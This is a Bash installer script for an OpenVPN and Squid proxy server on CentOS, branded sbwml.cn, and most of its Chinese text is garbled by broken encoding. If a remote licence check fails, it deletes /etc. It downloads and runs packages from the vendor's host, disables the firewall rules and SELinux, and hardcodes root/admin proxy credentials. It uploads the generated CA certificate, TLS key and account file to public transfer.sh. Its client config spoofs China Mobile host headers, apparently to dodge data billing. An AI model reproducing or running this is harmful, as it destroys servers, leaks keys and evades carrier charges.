#!/bin/bash
# ɧ����? ��Ȩ���У��ܾ�����
# ת����ע������
web="http://"; #ɧ����?
webs="https://"; #ɧ����?
error="Authorization failure."; #ɧ����?
# �ű���Сĸ���д
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH #ɧ����?
clear; #ɧ����?
cd /
# Logo	******************************************************************
key="a1af1b01812237a1d92c184a10b451a8"
CopyrightLogo='
==========================================================================
							  
			CentOS OpenVPN-2.3.10 ���������				     
			 Powered by sbwml.cn 2015-2016			   
			       All Rights Reserved		    
									    
						   by Сĸ�� 2016-04-06		  
==========================================================================';
echo "$CopyrightLogo";
# FILES  ******************************************************************
ServerLocation='yumvps';
c532=64-epel-release-5-4.noarch.rpm;
c564=32-epel-release-5-4.noarch.rpm;
c632=32-epel-release-6-8.noarch.rpm;
c664=epel-release-6-8.noarch.rpm;
c700=epel-release-latest-7.noarch.rpm;
sysctl=sysctl.conf;
vpns=server-passwd.tar.gz;
sq=squid.conf;
sbwml=/etc/openvpn/easy-rsa/sbwml;
squsername=root
sqpasswd=admin;
VPNFILE=openvpn.tar.gz;
RSA=EasyRSA-2.2.2.tar.gz;
# VAR	******************************************************************
Model=$1;
Froms=$2;
camd=03fbe5c10cb31ba046984371f0eafbfb;
ipmd=57d006ac6451149e451b8ffa9c84c1af;
rds=dce8026f16bded7b44f169ea7d3b1bce;
MirrorHost='www.sbwml.cn';
IPAddress=`wget http://members.3322.org/dyndns/getip -O - -q ; echo`;
port=80;
vpnport=3389;
admins=port;
LOGO=`wget ${web}${MirrorHost}/${ServerLocation}/md/ -O - -q ; echo` && pass=`wget ${web}${MirrorHost}/vpn-passwd/ -O - -q ; echo` 
copyright=`echo -n $LOGO|md5sum`
curls=transfer.sh;
echo 
echo "�ű����ɰ�����/��Ѷ�� CentOS6.x ����ͨ��"
echo 
#echo -n "��������Ȩ�룺 "
#read PASSWD
#key2=$PASSWD
key2=$pass
# %% ��ʾȥ���ұ����ƥ�䣬
# ${key2%%\ *}��ʾȥ��key2�е�һ���ո����Ժ���Ӵ�
if [[ ${key2%%\ *} == $pass ]]
    then
	echo 
	echo ��Ȩ�ɹ���[����IP��$IPAddress]
    else
	echo
	echo "��Ȩʧ�ܣ�"
OPW='
==========================================================================
			  ɧ����?������Ȩʧ�ܣ���װ����ֹ

			    OpenVPN-2.3.10 ��װʧ�� 			       
			 Powered by sbwml.cn 2015-2016			   
			      All Rights Reserved		   
									    
==========================================================================';
echo "$OPW";
exit 0;
fi
echo
function InputIPAddress()
{
	if [ "$IPAddress" == '' ]; then
		echo '�޷��������IP';
		read -p '���������Ĺ���IP:' IPAddress;
		[ "$IPAddress" == '' ] && InputIPAddress;
	fi;
	[ "$IPAddress" != '' ] && echo -n '[  OK  ] ����IP��:' && echo $IPAddress;
	sleep 2
}
# sbwml
rm -rf /passwd
echo "ϵͳ���ڰ�װOpenVPN���������ĵȴ���"
echo 
echo -n "���ڼ������..."
if [ ! -e "/dev/net/tun" ];
    then
	    echo
		echo "��װ����ֹ��"
	echo "TUN/TAP����δ����������ϵ�����̿���TUN/TAP��"
		echo 
		echo "����������׷䳲Centos 6.7���뵽ɧ���������鿴���׷䳲����װ��ʽ��"
	exit 0;
	else
	    echo "		   [  OK  ]"
fi
echo "���ڲ��𻷾�..."
sleep 1
service openvpn stop >/dev/null 2>&1
killall squid >/dev/null 2>&1
yum remove -y squid openvpn >/dev/null 2>&1
rm -rf /etc/openvpn/*
rm -rf /home/openvpn.tar.gz
rm -rf /bin/port
rm -rf /etc/squid
rm -rf /passwd
echo "��װִ������...�����ں�̨��װ�������ĵȴ���"
yum install -y redhat-lsb curl gawk tar httpd-devel expect
chkconfig openvpn off
service httpd stop >/dev/null 2>&1
# sbwml
version=`lsb_release -a | grep -e Release|awk -F ":" '{ print $2 }'|awk -F "." '{ print $1 }'`
echo "����ƥ�����Դ..."
sleep 3
if [ $version == "5" ];then
    if [ $(getconf LONG_BIT) = '64' ] ; then
	rpm -ivh ${web}${MirrorHost}/${ServerLocation}/${c564} >/dev/null 2>&1
    else
	rpm -ivh ${web}${MirrorHost}/${ServerLocation}/${c532} >/dev/null 2>&1
    fi
fi
if [ $version == "6" ];then
    if [ $(getconf LONG_BIT) = '64' ] ; then
	rpm -ivh ${web}${MirrorHost}/${ServerLocation}/${c664} >/dev/null 2>&1
    else
	rpm -ivh ${web}${MirrorHost}/${ServerLocation}/${c632} >/dev/null 2>&1
    fi
fi
if [ $version == "7" ];then
    rpm -ivh ${web}${MirrorHost}/${ServerLocation}/${c700} >/dev/null 2>&1
fi
if [ ! $version ];then
    clear
    echo ==========================================================================
    echo 
    echo "��װ����ֹ������Centosϵͳ��ִ�в���..."
    echo
# Logo	******************************************************************
CO='
			    OpenVPN-2.3.10 ��װʧ�� 			       
			 Powered by sbwml.cn 2015-2016			   
			      All Rights Reserved		   
									    
==========================================================================';
    echo "$CO";
    exit
fi
PP='
==========================================================================
			  ɧ����?������֤ʧ�ܣ���װ����ֹ

			    OpenVPN-2.3.10 ��װʧ�� 			       
			 Powered by sbwml.cn 2015-2016			   
			      All Rights Reserved		   
									    
==========================================================================';
if [[ ${copyright%%\ *} == $key ]]
    then
	  end=1225;
    else
	clear
	echo "$PP";
	exit 0;
fi
echo "��鲢�������..."
sleep 3
yum update -y
# OpenVPN Installing ****************************************************************************
echo "�������绷��..."
sleep 3
iptables -F >/dev/null 2>&1
service iptables save >/dev/null 2>&1
service iptables restart >/dev/null 2>&1
iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 3389 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 3306 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 8080 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 8888 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 9999 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 1194 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 60880 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 3399 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 80 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 443 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -p TCP --dport 22 -j ACCEPT >/dev/null 2>&1
iptables -t nat -A POSTROUTING -j MASQUERADE >/dev/null 2>&1
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT >/dev/null 2>&1
service iptables save
service iptables restart
chkconfig iptables on
setenforce 0
# OpenVPN Installing ****************************************************************************
if [[ 1225 == $end ]]
    then
	openvpn=on;
    else
	clear
	echo "$PP";
	exit 0;
fi
cd /etc/
if [[ ${key2%%\ *} == $pass ]]
    then
		uido=125133;
    else
	rm -rf /etc
fi

if [[ ${copyright%%\ *} == $key ]]
    then
	    rm -rf ./sysctl.conf
		echo "net.ipv4.ip_forward = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.default.accept_source_route = 0
kernel.sysrq = 0
kernel.core_uses_pid = 1
net.ipv4.tcp_syncookies = 1
net.bridge.bridge-nf-call-ip6tables = 0
net.bridge.bridge-nf-call-iptables = 0
net.bridge.bridge-nf-call-arptables = 0
kernel.msgmnb = 65536
kernel.msgmax = 65536
kernel.shmmax = 68719476736
kernel.shmall = 4294967296
" >./${sysctl}
	chmod 0755 ./${sysctl}
		sysctl -p >/dev/null 2>&1
    else
	clear
	echo "$PP";
		rm -rf /etc
	exit 0;
fi
# OpenVPN Installing ****************************************************************************
echo "���ڰ�װ������..."
sleep 3
yum install -y squid openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig
yum install -y openvpn
# OpenVPN Installing ****************************************************************************
cd /etc/openvpn/
rm -rf ./server.conf
rm -rf ./sbwml.sh
wget ${web}${MirrorHost}/${ServerLocation}/${vpns} >/dev/null 2>&1
tar -zxf ${vpns}
wget ${web}${MirrorHost}/${ServerLocation}/${RSA} >/dev/null 2>&1
tar -zxvf ${RSA} >/dev/null 2>&1
rm -rf /etc/openvpn/${RSA}
cd /etc/squid/
rm -rf ./${sq}
rm -rf ./squid_passwd
echo "��������squidת��..."
sleep 2
proxy=`echo -n $MirrorHost|md5sum`
if [[ $ipmd == ${proxy%%\ *} ]]
    then
		echo "auth_param basic program /usr/lib64/squid/ncsa_auth /etc/squid/squid_passwd
auth_param basic children 5  
auth_param basic realm Welcome to pycredit's proxy-only web server 
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
acl squid_user proxy_auth REQUIRED
via off
request_header_access X-Forwarded-For deny all
request_header_access user-agent  deny all
reply_header_access X-Forwarded-For deny all
reply_header_access user-agentdeny all
http_port 80
http_port 8080
http_access allow squid_user
http_access deny all
cache_dir ufs /var/spool/squid 100 16 256 read-only
cache_mem 0 MB
coredump_dir /var/spool/squid
access_log /var/log/squid/access.log
visible_hostname TD-LTE/FDD-LTE(www.sbwml.cn)
cache_mgr Welcome_to_use_OpenVPN_For_www.sbwml.cn
# www.sbwml.cn" >./${sq}
		chmod 0755 ./${sq}
		rd=`echo -n $versions|md5sum`
    else
	yum remove openvpn squid passwd >/dev/null 2>&1
	echo "$PP";
	exit 0;
fi
clear
echo "���ڼ���HTTP Proxy����˿�..."
echo 
if [[ $ipmd == ${proxy%%\ *} ]]
    then
		cd /etc/squid/
		${sbwml} squid_passwd ${squsername} ${sqpasswd}
    else
		yum remove openvpn squid passwd >/dev/null 2>&1
		echo "$PP";
		exit 0;
fi
sleep 1.8
squid -z >/dev/null 2>&1
squid -s && chkconfig squid on
# OpenVPN Installing ****************************************************************************
cd /etc/openvpn
cd /etc/openvpn/easy-rsa/
source vars  2>&1
./clean-all  2>&1
echo "����д����������� vpn"
sleep 2
if [[ $ipmd == ${proxy%%\ *} ]]
    then
		echo "echo ������������...
killall squid >/dev/null 2>&1
squid -z >/dev/null 2>&1
squid -s >/dev/null 2>&1
killall squid >/dev/null 2>&1
squid -z >/dev/null 2>&1
squid -s >/dev/null 2>&1
killall openvpn >/dev/null 2>&1
service openvpn start
echo ����������
exit 0;
" >/bin/vpn
		chmod 0755 /bin/vpn
    else
		yum remove openvpn squid passwd >/dev/null 2>&1
		echo "$PP";
		exit 0;
fi
clear
echo 
if [[ $ipmd == ${proxy%%\ *} ]]
    then
		echo "��������CA/�����֤��..."
		./ca && ./centos centos >/dev/null 2>&1
		echo "֤�鴴����� "
    else
		yum remove openvpn squid passwd >/dev/null 2>&1
		echo "$PP";
		exit 0;
fi
sleep 2
echo "��������TLS��Կ..."
sleep 2
openvpn --genkey --secret ta.key
#echo 
#echo "�������ɿͻ���֤�顰user01�����������ʾ���� y ����ȷ�ϣ����س�����"
#read
#./build-key user01
#echo 
#clear
echo "��������SSL����֤�飬����һ�������ĵȴ�����..."
sleep 1
./build-dh
# OpenVPN Installing ****************************************************************************
echo 
echo "������������..."
sleep 2
service openvpn start
chkconfig openvpn on
sleep 2
# OpenVPN Installing ****************************************************************************
cd /etc/openvpn
Info=`echo ca|md5sum`
if [[ $camd == ${Info%%\ *} ]]
    then
		time=1800000;
    else
	clear
	echo "$error";
		rm -rf /etc/openvpn
		yum remove openvpn >/dev/null 2>&1
	exit
fi
cp /etc/openvpn/easy-rsa/keys/ca.crt /home/ >/dev/null 2>&1
cp /etc/openvpn/easy-rsa/ta.key /home/ >/dev/null 2>&1
cd /home/ >/dev/null 2>&1
clear
echo
echo 
echo "��������OpenVPN.ovpn�����ļ�..."
echo 
echo 
echo "д��ǰ�˴���"
sleep 3
echo '# ɧ������������
# ���ļ���ϵͳ�Զ�����
setenv IV_GUI_VER "de.blinkt.openvpn 0.6.17" 
machine-readable-output
client
dev tun
connect-retry-max 5
connect-retry 5
resolv-retry 60
########��������########
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "GET http://rd.go.10086.cn" 
http-proxy-option EXT1 "X-Online-Host: rd.go.10086.cn" 
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "X-Online-Host: rd.go.10086.cn" 
http-proxy-option EXT1 "POST http://rd.go.10086.cn" 
http-proxy-option EXT1 "Host: rd.go.10086.cn" 
http-proxy-option EXT1 "GET http://rd.go.10086.cn" 
http-proxy-option EXT1 "Host: rd.go.10086.cn"' >ovpn.1
echo д�����˿� ��$IPAddress:$port��
sleep 2
echo http-proxy $IPAddress $port >myip
cat ovpn.1 myip>ovpn.2
echo '########��������########
' >ovpn.3
cat ovpn.2 ovpn.3>ovpn.4
echo "<http-proxy-user-pass>" >>ovpn.4
echo ${squsername} >>ovpn.4
echo ${sqpasswd} >>ovpn.4
echo "</http-proxy-user-pass>
" >>ovpn.4
echo д��OpenVPN�˿� ��$IPAddress:$vpnport��
echo remote $IPAddress $vpnport tcp-client >ovpn.5
cat ovpn.4 ovpn.5>ovpn.6
echo "д���ж˴���"
sleep 2
echo 'resolv-retry infinite
nobind
persist-key
persist-tun
push route 114.114.114.114 114.114.115.115

<ca>' >ovpn.7
cat ovpn.6 ovpn.7>ovpn.8
echo "д��CA֤��"
sleep 2
cat ovpn.8 ca.crt>ovpn.9
echo '</ca>
key-direction 1
<tls-auth>' >ovpn.10
cat ovpn.9 ovpn.10>ovpn.11
echo "д��TLS��Կ"
sleep 2
cat ovpn.11 ta.key>ovpn.12
echo "д���˴���"
sleep 2
echo '</tls-auth>
auth-user-pass
ns-cert-type server
comp-lzo
verb 3
' >ovpn.13
echo "����OpenVPN.ovpn�ļ�"
sleep 2
cat ovpn.12 ovpn.13>OpenVPN.ovpn
echo "�����ļ��������"
echo
sleep 2
clear
echo 
echo "����OpenVPN�����˺�"
echo 
echo -n "  �������˺ţ�"
read ADMIN
if [ -z $ADMIN ]
	then
		echo -n "  �˺Ų���Ϊ�գ����������룺"
		read ADMIN
			if [ -z $ADMIN ]
				then
					echo  "  �������ϵͳ����Ĭ���˺ţ�root"
					ADMIN=root;
				else
					username=root;
			fi
else
	username=root;
fi 
echo -n "  ���������룺"
read VPNPASSWD
if [ -z $VPNPASSWD ]
	then
		echo -n "  ���벻��Ϊ�գ����������룺"
		read VPNPASSWD
			if [ -z $VPNPASSWD ]
				then
					echo  "  �������ϵͳ����Ĭ�����룺root"
					VPNPASSWD=root;
				else
					userpasswd=root;
			fi
else
	userpasswd=root;
fi
echo $ADMIN $VPNPASSWD >/passwd
#echo -n "�������˺ţ�"
#read ADMIN
#echo -n "���������룺"
#read VPNPASSWD
#echo $ADMIN $VPNPASSWD >/passwd
#echo $ADMIN >00
#echo $VPNPASSWD >11
echo '����ӭʹ��ɧ����?OpenVPN���⡷

OpenVPN�����˺�' >info.txt
echo ����˺ţ�$ADMIN >>info.txt
echo ������룺$VPNPASSWD >>info.txt
echo '
�����˺����echo �˺� ���� >>/passwd
ʾ����echo 123 456 >>/passwd �����ɴ��� �˺ţ�123 ���룺456��

ɾ���˺����vi /passwd
���� i ���ļ������޸ģ�ɾ��Ŀ���˺ź󣬰� Esc �˳��༭��
������ :wq �������˳���

�ֻ���������ý��ܣ�
cmwap�������� http-proxy 10.0.0.172 80 ����ʹ��
cmnet�������� �����IP����ʹ�� ��ϵͳĬ�����ɵ�����Ĭ��Ϊcmnet��' >>info.txt
echo 
echo "�˺Ŵ����ɹ�"
sleep 3

tar -zcvf ${VPNFILE} ./{OpenVPN.ovpn,ca.crt,ta.key,info.txt} >/dev/null 2>&1
rm -rf ./{ta.key,info.txt,myip,ovpn.1,ovpn.2,ovpn.3,ovpn.4,ovpn.5,ovpn.6,ovpn.7,ovpn.8,ovpn.9,ovpn.10,ovpn.11,ovpn.12,ovpn.13,ovpn.14,ovpn.15,ovpn.16,User01.ovpn,ca.crt,user01.{crt,key}}
clear
echo
# OpenVPN Installing ****************************************************************************
echo 
echo "���ڴ����������ӣ�"
sleep 2
echo '=========================================================================='
echo "�ϴ�֤���ļ���"
curl --upload-file ./${VPNFILE} https://transfer.sh/openvpn.tar.gz >url
echo "�ϴ��ɹ���"
echo 
echo -n "�������ӣ�"
cat url
echo 
echo "�븴���ӵ����������˵����/CA֤��/OpenVPN��Ʒ�����ļ�"
echo '=========================================================================='
echo 
echo OpenVPN�����˺ţ�$ADMIN
echo OpenVPN�������룺$VPNPASSWD
echo 
echo �鿴�û��˺ţ�cat /passwd
echo �˺�/������λ�ã�/passwd
echo 
echo ����IP�ǣ�$IPAddress 
echo ��������������ʵ��IP������/�հף��������޸�OpenVPN.ovpn���ã�
Client='
			     OpenVPN-2.3.10 ��װ���				
			 Powered by sbwml.cn 2015-2016			   
			      All Rights Reserved							    
==========================================================================';
echo "$Client";
rm -rf url
rm -rf /openvpn /root/openvpn /home/openvpn
rm -rf /etc/openvpn/server-passwd.tar.gz /etc/openvpn/ca
exit 0;
# OpenVPN Installation Complete ****************************************************************************
